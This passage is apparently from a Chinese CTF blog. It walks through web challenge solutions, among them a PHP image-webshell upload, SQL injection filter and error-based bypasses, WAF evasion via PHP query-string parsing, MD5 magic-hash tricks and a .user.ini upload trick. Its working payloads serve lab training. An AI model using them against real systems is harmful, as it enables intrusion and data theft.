新生赛]Upload</strong>这一题也是用phtml上传</p><p>但是显示不能带<code>&lt;?</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022154277.png" alt="image-20250402215451218"></p><p>这里我们专门制作一个图片马，文件内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>成功上传</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022203755.png" alt="image-20250402220343696"></p><p>蚁剑连接，出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022206825.png" alt="image-20250402220626769"></p><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>输入如下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081742786.png" alt="image-20250408174237619"></p><p>注入点在password</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081743341.png" alt="image-20250408174323252"></p><p><code>&#39; union select 1,2,3#</code></p><p>但是回显只有<code>1,2,3#</code>，应该是有过滤</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081744223.png" alt="image-20250408174430971"></p><p><code>1&#39; UNunionION SELselectECT 1,2,3#</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081746204.png" alt="image-20250408174617004"></p><p>这里有一个点，flag并不在当前数据库里（不要固化思维），所以我们要查所有库</p><p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(schema_name) FRfromOM infoorrmation_schema.schemata#</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081749775.png" alt="image-20250408174929545"></p><p>这里当前库是geek，flag不在geek库里，在ctf库里</p><p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(table_name) FRfromOM infoorrmation_schema.tables WHwhereERE table_schema = &#39;ctf&#39;#</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081754969.png" alt="image-20250408175405736"></p><p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(column_name) FRfromOM infoorrmation_schema.columns WHwhereERE table_name = &#39;Flag&#39;#</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081755427.png" alt="image-20250408175529169"></p><p>注意字段在ctf库的Flag表里，直接查会有如下结果</p><p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(flag) FRfromOM Flag#</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081759078.png" alt="image-20250408175953022"></p><p>语句如下</p><p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(flag) FRfromOM ctf.Flag#</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081800050.png" alt="image-20250408180018845"></p><p>这题其实并不难</p><p>关键点在于黑盒过滤以及flag不在本库的注入手段</p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>一开始是一个计算器</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082245019.png" alt="image-20250408224526861"></p><p>右键查看源代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082246259.png" alt="image-20250408224610906"></p><p>让我们看一下其中的关键代码，这里JavaScript代码的作用是：</p><p>先向服务器发送要计算的数据， 用jQuery 选择器选中id为 “calc” 的表单元素，提取其中id为 “content”的HTML标签元素的值（即<code>(&quot;#content&quot;).val()</code>相当于<code> document.getElementById(&quot;content&quot;).value</code>），并将其编码后放到<code>calc.php?num=</code>后面，比如我们在计算器上输入1+1，实际就是发送<code>num=1%2b1</code>到calc.php；然后处理服务器的响应并显示，当服务器返回成功响应时返回运算结果，当请求失败时返回“这啥?算不来!“。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    $(<span class="hljs-string">&#x27;#calc&#x27;</span>).<span class="hljs-title function_">submit</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).<span class="hljs-title function_">val</span>()),</span><br><span class="language-javascript">            <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;GET&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span><br><span class="language-javascript">                $(<span class="hljs-string">&quot;#result&quot;</span>).<span class="hljs-title function_">html</span>(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span></span><br><span class="hljs-string"><span class="language-javascript">            &lt;/div&gt;`</span>);</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后这里我们看看calc.php</p><p>无非是一个黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>然后我们尝试在calc.php输入<code>?num=phpinfo()</code>,试图执行<code>echo phpinfo();</code></p><p>可以看到这里报错，我们没权限直接向calc.php传递数据</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082311468.png" alt="image-20250408231136211"></p><p>实测传递<code>?num=1</code>和<code>?num=1%2b1</code>可行（这里传参本质上和在计算器那里输入是一样的）</p><p>可以发现，这里num变量传递字母之类的都是不行的，</p><p>我们回想到</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span><br></code></pre></td></tr></table></figure><p>所以这里应该还有WAF，WAF之后才是calc.php，然后我们还要绕过calc.php的黑名单</p><p>原来waf我们是看不见的，我一直以为题里的源码，就是waf了。并且，waf并不是说，题目是用php写的，那么waf就一定是用php写的（也正因如此，这题的waf才会无法识别“ num”和“num”其实是一样的）。</p><p>这里怎么过WAF呢？有两种方法</p><p>第一种，PHP的字符串解析特性</p><blockquote><p>PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><p>1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。</p><p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫<code>“ num”</code>，而不是<code>“num”</code>。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p></blockquote><p>所以我们传参<code>? num=phpinfo()</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082330602.png" alt="image-20250408233037288"></p><p>然后我们尝试命令执行<code>? num=;system(&#39;ls&#39;)</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082330838.png" alt="image-20250408233010770"></p><p>看来WAF挺强的（其实disable_fuction也有system）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082339180.png" alt="image-20250408233941096"></p><p>所以这里我们<strong>scandir() 函数</strong>进行目录读取，<strong>file_get_contents() 函数</strong>进行flag读取。</p><p><strong>chr() 函数</strong>：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。</p><p><strong>file_get_contents() 函数</strong>：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p><p>var_dump() 将变量以字符串形式输出，替代print和echo.</p><p>scandir() 扫描某个目录并将结果以array形式返回，配和vardump 可以替代system(‘ls;’)</p><p>由于“&#x2F;”被过滤了，所以我们可以使用chr(47)来进行表示<code>? num=1;var_dump(scandir(chr(47)))</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082333991.png" alt="image-20250408233346711"></p><p>构造：<code>/flagg</code>——&gt;<code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code><br>payload：<code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082335148.png" alt="image-20250408233517873"></p><p>空格也可换为+，如<code>?+num=var_dump(scandir(chr(47)))</code>，php解析时，如果变量前面有空格，会去掉前面的空格再解析，PHP解析时 ,<code>&#39;num&#39;</code>&#x3D;<code>&#39; num&#39;</code>&#x3D;<code>&#39;+num&#39;</code>三者认为是同一个变量，但是waf只认<code>’num’</code>而<code>’ num’</code>和<code>’+num’</code>都不在范围内，这样就能绕过waf。</p><p>chr(47)也可以换为hex2bin(dechex(47))，如<code>?+num=var_dump(scandir(hex2bin(dechex(47))))</code>，dechex()函数把十进制数转换为十六进制数。hex2bin()函数把十六进制值的字符串转换为 ASCII字符。</p><p>file_get_contents()可换为file()，如<code>? num=1;var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>，readfile()也可以<code>? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>，甚至可以用代码混淆技术，将readfile()换为<code>? num=1;base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code></p><p>第二种，HTTP请求走私</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504090005083.png" alt="image-20250409000537738"></p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>这道题比较考验信息搜集和信息处理能力</p><p>入手点在菜单处</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091045621.png" alt="image-20250409104519333"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091045167.png" alt="image-20250409104557819"></p><p>然后这里给了提示，虽然这里并不知道是什么意思</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091046076.png" alt="image-20250409104652888"></p><p>查看源代码</p><p>发现要用post传递money和password</p><p>这里password要弱等于404，且不能是数字，这里用404a</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091047662.png" alt="image-20250409104754377"></p><p>money等于多少呢？</p><p>实际上已经给了提示，100000000</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091050747.png" alt="image-20250409105007557"></p><p>所以我们抓包传参</p><p>这里根据提示，似乎是将cookie中的user改为1</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091052133.png" alt="image-20250409105247941"></p><p>又显示数字太长</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091053575.png" alt="image-20250409105334324"></p><p>我们改成科学计数</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091054674.png" alt="image-20250409105448470"></p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>一开始并没有在第一个网页中找到思路</p><p>只是提交查询后弹出了一个参数</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091551756.png" alt="image-20250409155121654"></p><p>没想到提示要抓包重放看</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091102922.png" alt="image-20250409110254755"></p><blockquote><p>Hint: select * from ‘admin’ where password&#x3D;md5($pass,true)</p></blockquote><p><strong>md5(string,raw)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要计算的字符串。</td></tr><tr><td>raw</td><td>可选。规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式；FALSE - 默认。32 字符十六进制数</td></tr></tbody></table><p>这里采用万能密码的方式去绕过，即构造or来绕过password</p><p>但这里输入要经过md5($pass,true)，怎么构造万能密码呢？</p><p>可以发现<code>md5(&#39;ffifdyop&#39;,true)</code>的结果为<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code></p><p>所以原sql查询语句则变为<code>select * from user where username =&#39;admin&#39; and password =&#39;&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c&#39;</code>，即可绕过</p><p>类似的字符串还有:<code>md5(&#39;129581926211651571912466741651878684928&#39;,true)</code>&#x3D;<code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091546105.png" alt="image-20250409154644992"></p><p>所以我们只需要输入ffifdyop就可以绕过</p><p>然后进入第二个网页</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091556862.png" alt="image-20250409155615608"></p><p>右键查看源代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091552337.png" alt="image-20250409155211977"></p><p>这里使用了&#x3D;&#x3D;弱比较</p><p>&#x3D;&#x3D; 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较</p><p>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。</p><p>这里完全可以去寻找明文不同但MD5值为”0exxxxx”</p><p>这里提供两个QNKCDZO和s878926199a，s878926199a和s155964671a</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=s878926199a&amp;b=s155964671a<br>?<span class="hljs-attribute">a</span>=QNKCDZO&amp;b=s878926199a<br></code></pre></td></tr></table></figure><p>然后进入第三个网页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>这里用php数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false&#x3D;&#x3D;false成立使条件成立。<br> <code>param1[]=1&amp;param2[]=2</code></p><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>又是黑盒</p><p>经测试，一些and、union、select、空格等常见的SQL语句被过滤了</p><p>这里用报错注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101523649.png" alt="image-20250410152353242"></p><p>用户名和密码其实都是注入点</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database()),<span class="hljs-number">1</span>))#<br>&#x27;or(<span class="hljs-name">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101529058.png" alt="image-20250410152906745"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">table_name</span>))from(<span class="hljs-name">information_schema</span>.tables)where(<span class="hljs-name">table_schema</span>)like(<span class="hljs-name">database</span>()))),<span class="hljs-number">1</span>))#<br>&#x27;or(<span class="hljs-name">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">table_name</span>))from(<span class="hljs-name">information_schema</span>.tables)where(<span class="hljs-name">table_schema</span>)like(<span class="hljs-name">database</span>())))))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101534419.png" alt="image-20250410153450136"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">column_name</span>))from(<span class="hljs-name">information_schema</span>.columns)where(<span class="hljs-name">table_name</span>)like(&#x27;H4rDsq1&#x27;))),<span class="hljs-number">1</span>))#<br>&#x27;or(<span class="hljs-name">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">column_name</span>))from(<span class="hljs-name">information_schema</span>.columns)where(<span class="hljs-name">table_name</span>)like(&#x27;H4rDsq1&#x27;)))))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101537385.png" alt="image-20250410153704148"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">id</span>,&#x27;:&#x27;,username,&#x27;:&#x27;,password))from(<span class="hljs-name">H4rDsq1</span>))),<span class="hljs-number">1</span>))#<br>&#x27;or(<span class="hljs-name">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">id</span>,&#x27;:&#x27;,username,&#x27;:&#x27;,password))from(<span class="hljs-name">H4rDsq1</span>)))))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101541228.png" alt="image-20250410154120127"></p><p>这里只有部分flag，还要看另一部分</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>((<span class="hljs-name">right</span>(<span class="hljs-name">password</span>,<span class="hljs-number">25</span>))))from(<span class="hljs-name">H4rDsq1</span>)),<span class="hljs-number">0</span>x7e),<span class="hljs-number">1</span>))#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101544505.png" alt="image-20250410154433175"></p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>这道题和之前也是比较像的</p><p>首先上传了绕过短标签<code>&lt;?</code>的图片马，然后上传了.htaccess，发现直接用蚁剑连接webshell1.jpg时报错</p><p>并不能想明白是为啥，这时候我们需要了解下面几个配置文件的区别</p><ul><li>php.ini</li></ul><blockquote><p>php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。<br>PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，.user.ini中设置。</p></blockquote><ul><li>.user.ini</li></ul><blockquote><p>.user.ini文件<br>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。<br>它比.htaccess(分布式配置文件)用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi(进程管理器)运行的php都可以用这个方法。<br>Php配置项中有两个比较有意思的项<br>auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。<br>auto_append_file类似，只是在文件后面包含。</p></blockquote><ul><li>.htaccess</li></ul><blockquote><p>.htaccess叫分布式配置文件，它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。并且子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。一般来说，如果你的虚拟主机使用的是Unix或Linux系统，或者任何版本的Apache网络服务器，从理论上讲都是支持.htaccess的。<br>目录规则:一般我们将.htaccess文件放置在网站的根目录，控制所在目录及所有子目录，而如果放置在子目录中，会受上级目录中.htaccess文件影响，是不起任何作用的。<br>.htaccess可以实现：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p></blockquote><p>所以.htaccess相对而言是比较针对Apache网络服务器，这时候我们看到上传路径里竟然有PHP文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102123817.png" alt="image-20250410212343734"></p><p>这时候我们可以考虑到上传.user.ini，</p><p>因为“不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi(进程管理器)运行的php都可以用这个方法”、“auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数”</p><p>所以这里上传了.user.ini（注意上传图片马的时候改名，使其对应.user.ini）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102125651.png" alt="image-20250410212520554"></p><p>然后用蚁剑连接PHP文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102128835.png" alt="image-20250410212814747"></p><p>注意这里的index.php并不是我们网页的那个PHP文件（里面实际上什么代码也没有）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102128640.png" alt="image-20250410212850479"></p><p>网页的是这个，里面有上传文件的代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102129429.png" alt="image-20250410212919295"></p><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>给了源码地址</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102149539.png" alt="image-20250410214956445"></p><p>测出注入点在username</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102150414.png" alt="image-20250410215052333"></p><p>然后还可以知道返回字段数为3</p><p><code>&#39;union select 1,2,3#</code></p><p>但是联合查询包括报错注入都不好使</p><p>然后发现提示</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102154133.png" alt="image-20250410215425046"></p><p>这是一段Base32加Base64的编码，解密结果为<code>select * from user where username = &#39;$name&#39;</code></p><p>但到这里就没有思路了</p><p>然后看了看源码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$sql</span> = <span 